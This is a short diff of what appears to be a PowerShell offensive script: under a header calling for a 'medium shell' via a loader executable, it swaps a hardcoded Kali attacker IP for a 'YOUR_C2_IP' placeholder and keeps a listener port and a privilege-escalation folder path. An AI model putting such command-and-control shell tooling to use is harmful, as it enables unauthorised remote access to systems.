@@ -9,8 +9,9 @@
 # Level 3: Direct sg_loader.exe (medium shell)
 # =============================================================
 
-$kali  = "192.168.217.146"
-$port  = 443
+# ── Configure these before running ───────────────────────────
+$kali  = "YOUR_C2_IP"   # Replace with your C2 IP
+$port  = 443             # Replace with your listener port
 $lpe   = "C:\ProgramData\lpe"
 
 # ── Bootstrap: ensure sg_loader.exe is available ──────────────
